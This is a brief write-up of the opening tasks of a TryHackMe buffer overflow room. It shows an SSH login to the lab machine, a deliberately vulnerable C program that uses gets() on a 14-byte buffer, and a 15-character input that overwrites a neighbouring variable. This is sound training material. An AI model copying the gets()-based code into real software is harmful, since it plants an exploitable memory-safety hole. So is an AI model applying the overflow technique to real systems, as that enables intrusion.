# Buffer Overflows
<button type="button" name="button" class="btn">#BufferOverflow</button>

You can find this room on TryHackMe [Here](https://tryhackme.com/room/bof1). 

## Introduction
We connect to the machine via ssh as instructed:
```
ssh user1@10.10.183.
user1@10.10.183.44's password: 

Last login: Wed Nov 27 21:42:30 2019 from 82.34.52.37

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

[user1@ip-10-10-183-44 ~]$ 
```

## Overwriting Variables
We're asked to take a look at the overflow-1.c file and can see the following:
```c
[user1@ip-10-10-183-44 ~]$ cd overflow-1
[user1@ip-10-10-183-44 overflow-1]$ ls
int-overflow  int-overflow.c
[user1@ip-10-10-183-44 overflow-1]$ cat int-overflow.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

Because this char buffer's length is 14, we know that we need at least 15 characters to overwrite it.

We run the function and successfully change the value of the variable by entering in 15 A's:
```
[user1@ip-10-10-183-44 overflow-1]$ ./int-overflow
AAAAAAAAAAAAAAA
You have changed the value of the variable
```
